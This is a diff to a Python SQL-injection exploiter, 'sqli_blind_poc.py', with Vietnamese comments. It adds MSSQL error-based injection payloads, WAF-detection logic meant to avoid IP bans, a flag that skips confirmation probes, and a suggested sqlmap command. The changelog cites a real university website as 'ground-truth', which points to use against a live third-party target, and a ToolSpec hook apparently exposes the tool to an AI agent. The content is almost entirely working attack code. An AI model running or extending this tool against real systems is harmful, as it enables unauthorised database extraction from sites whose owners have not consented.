@@ -3,6 +3,15 @@
 aixsec-x — sqli_blind_poc.py
 SQLi time-based blind exploiter KHÔNG cần sqlmap (Python thuần: requests + timing).
 
+v1.4.6:
+  - MSSQL error-based oracle: SHAPES quote-then-paren ("') AND CONVERT...") —
+    khớp ground-truth tbu.edu.vn (context LIKE có ngoặc).
+  - WAF burst detection: ≥2/3 probe oracle status-0 → nghi WAF, dừng đúng
+    sau 3 request oracle, KHÔNG rơi vào lưới 9 probe time-based.
+  - known_confirmed: lỗi đã xác nhận ở phiên trước → bỏ qua lưới 9
+    quote/comment, xác nhận ngay sau baseline.
+  - WAF → guidance: sqlmap --technique=E (thêm --form khi POST form).
+
 Hỗ trợ 3 kiểu vị trí inject:
   - query:  /product.php?id=123          →  ?id=123' AND (cond) AND SLEEP(3)-- -
   - path:   /search/123.html             →  /search/123%27%20AND%20(cond)%20AND%20SLEEP(3)--%20-.html
@@ -90,6 +99,7 @@ class MsSqlErrorOracle:
         self.timeout = int(timeout)
         self.chunk = int(chunk)
         self.shape = None          # index SHAPE đã probe thành công
+        self.waf_suspected = False # WAF burst: ≥2/3 probe oracle status-0
         self.s = requests.Session()
         self.s.headers.update({"User-Agent": _USER_AGENT})
         if headers:
@@ -106,21 +116,23 @@ class MsSqlErrorOracle:
         return parse_qs(data)
 
     def _templates(self, inner: str) -> list[str]:
-        """inner = đoạn inject sau quote đóng (vd ' AND CONVERT(int,(x))).
+        """inner = đoạn inject sau quote đóng (vd " AND CONVERT(int,(x))).
 
-        3 SHAPES đóng quote/ngoặc cho các context:
-          1) '<inner>-- -              → LIKE '%...%' không ngoặc
-          2) ')<inner>-- -             → (Field LIKE '%...%') 1 ngoặc
-          3) '))<inner>-- -            → ((Field LIKE '%...%')) 2 ngoặc
+        Quote nằm trong SHAPE prefix (quote-then-paren) — khớp ground-truth
+        tbu.edu.vn: mock/lexer chỉ bắn lỗi conversion cho "') AND CONVERT" và
+        "')) AND CONVERT" (shape 1, 2), không cho shape 0:
+          1) '<inner>-- -        → LIKE '%...%' không ngoặc
+          2) ')<inner>-- -       → (Field LIKE '%...%') 1 ngoặc
+          3) '))<inner>-- -      → ((Field LIKE '%...%')) 2 ngoặc
         """
         return [
-            f"{inner}-- -",
-            f"){inner}-- -",
-            f")){inner}-- -",
+            f"'{inner}-- -",
+            f"'){inner}-- -",
+            f"')){inner}-- -",
         ]
 
     def _inject(self, expr: str) -> list[str]:
-        return self._templates(f"' AND CONVERT(int,({expr}))")
+        return self._templates(f" AND CONVERT(int,({expr}))")
 
     def _request(self, injected: str) -> tuple[int, str]:
         """Gửi 1 payload → (status, toàn bộ body). Body đầy đủ (không cắt 300)
@@ -160,16 +172,31 @@ class MsSqlErrorOracle:
 
     # ────────────── detect ──────────────
     def detect(self) -> bool:
-        """Probe @@VERSION qua lỗi conversion → chọn SHAPE hoạt động."""
+        """Probe @@VERSION qua lỗi conversion → chọn SHAPE hoạt động.
+
+        WAF burst detection: nếu ≥2/3 probe bị reset (status 0 → kết nối bị
+        chặn/ngắt), nghi WAF → dừng đúng sau 3 request oracle, không spam
+        thêm payload (tránh bị chặn hẳn / ban IP).
+        """
+        resets = 0
         for i, tpl in enumerate(self._inject("SELECT @@VERSION")):
-            _, body = self._request(tpl)
+            status, body = self._request(tpl)
+            if status == 0:
+                resets += 1
+                print(f"    shape {i}: probe bị reset (status 0)")
+                continue
             m = self.VALUE_RX.search(body)
             if m:
                 self.shape = i
                 print(f"[+] MSSQL error-based oracle OK (shape {i}): "
                       f"{m.group(1).replace("''", "'")[:60]}")
                 return True
-        print("[-] MSSQL error-based oracle: không thấy lỗi conversion")
+        if resets >= 2:
+            self.waf_suspected = True
+            print(f"[-] MSSQL error-based oracle: WAF suspected "
+                  f"({resets}/3 probe status-0)")
+        else:
+            print("[-] MSSQL error-based oracle: không thấy lỗi conversion")
         return False
 
     # ────────────── extraction ──────────────
@@ -241,7 +268,8 @@ class TimeBlindExploiter:
     def __init__(self, url: str, delay: float = 3.0, threshold: float = 2.5,
                  timeout: int = 15, headers: dict | None = None,
                  engine: str = "mysql", method: str = "get",
-                 param: str | None = None, data=None):
+                 param: str | None = None, data=None,
+                 known_confirmed: bool = False):
         if engine not in ("mysql", "mssql"):
             raise ValueError(f"engine phải là mysql hoặc mssql (nhận {engine!r})")
         self.engine = engine
@@ -273,6 +301,8 @@ class TimeBlindExploiter:
         self.data = data              # form data POST ("a=1&b=2" hoặc dict)
         self.oracle = None            # MsSqlErrorOracle nếu error-based ăn
         self.technique = "time-based"  # "time-based" | "error-based-mssql"
+        self.known_confirmed = bool(known_confirmed)  # skip lưới 9 probe
+        self.waf_suspected = False    # oracle detect() thấy WAF burst
 
     # ────────────── thiết lập vị trí inject ──────────────
     def _locate_injection(self) -> str:
@@ -403,10 +433,22 @@ class TimeBlindExploiter:
                 self.technique = "error-based-mssql"
                 print("[+] SQLi CONFIRMED (error-based oracle)")
                 return True
+            if orb.waf_suspected:
+                # WAF chặn → dừng ngay, KHÔNG đo baseline / không 9-grid
+                self.waf_suspected = True
+                print(self._waf_guidance())
+                return False
             print("[-] Oracle không ăn → fallback time-based WAITFOR DELAY")
         t0, _, _ = self._request(self.orig_value)
         self.baseline = t0
         print(f"[*] Baseline: {t0:.2f}s")
+
+        if self.known_confirmed:
+            # Lỗi đã xác nhận ở phiên trước (sqli_manual_test CONFIRMED):
+            # skip lưới 9 quote/comment, xác nhận ngay sau baseline.
+            self.quote, self.comment = "'", "-- -"
+            print("[+] SQLi CONFIRMED (known_confirmed — bỏ qua lưới 9 probe)")
+            return True
 
         trials = []
         for q in ("'", '"', ""):
@@ -425,6 +467,16 @@ class TimeBlindExploiter:
                 return True
         print("[-] SQLi NOT CONFIRMED")
         return False
+
+    # ────────────── WAF guidance ──────────────
+    def _waf_guidance(self) -> str:
+        """Hướng dẫn khi nghi WAF chặn probe: sqlmap error-based (--technique=E)."""
+        form = " --form" if (self.method == "post" and self.mode == "form") else ""
+        dbms = self.engine if self.engine in ("mssql", "mysql") else "mssql"
+        return (f"[!] WAF suspected — probe bị reset (status 0). Dừng để tránh "
+                f"bị chặn/ban IP.\n"
+                f"    Chạy: sqlmap{form} -u {self.url} --dbms={dbms} "
+                f"--technique=E --batch")
 
     # ────────────── helpers ──────────────
     def _is_true(self, expr: str) -> bool:
@@ -525,12 +577,18 @@ class TimeBlindExploiter:
         """Kết quả có cấu trúc cho ToolSpec `sqli_blind_extract`."""
         out = {"url": self.url, "confirmed": False, "data": {}}
         if not self.detect():
-            out["error"] = "SQLi not confirmed"
+            if self.waf_suspected:
+                out["error"] = ("WAF suspected — probe bị reset (status 0). "
+                                "Thử sqlmap --technique=E")
+            else:
+                out["error"] = "SQLi not confirmed"
+            out["waf_suspected"] = self.waf_suspected
             return out
         out["confirmed"] = True
         out["technique"] = self.technique
         out["mode"] = self.mode
         out["injection"] = f"{self.mode}@{self.param or self.path_seg_idx} quote={self.quote or 'none'}"
+        out["waf_suspected"] = self.waf_suspected
         if action in ("version", "detect"):
             out["data"]["version"] = self.version() if action == "version" else None
         elif action == "database":
@@ -585,17 +643,24 @@ def cli() -> int:
     ap.add_argument("--data", default="",
                     help="Form data POST dạng 'a=1&b=2' (dùng với --method post)")
     ap.add_argument("--json", action="store_true", help="Xuất kết quả JSON")
+    ap.add_argument("--known-confirmed", action="store_true",
+                    help="SQLi đã xác nhận ở phiên trước — bỏ qua lưới 9 probe "
+                         "quote/comment, xác nhận ngay sau baseline")
     args = ap.parse_args()
 
     ex = TimeBlindExploiter(args.url, delay=args.delay, threshold=args.threshold,
                             timeout=args.timeout, engine=args.engine,
                             method=args.method, param=args.param or None,
-                            data=args.data or None)
+                            data=args.data or None,
+                            known_confirmed=args.known_confirmed)
     print(f"===== SQLi blind exploiter =====")
     print(f"Target: {args.url}\n")
 
     if not ex.detect():
-        print("\n[!] SQLi không xác nhận — thoát.")
+        if ex.waf_suspected:
+            print("\n" + ex._waf_guidance())
+        else:
+            print("\n[!] SQLi không xác nhận — thoát.")
         return 1
     if args.detect_only:
         print("\n[✓] CONFIRMED (detect-only)")
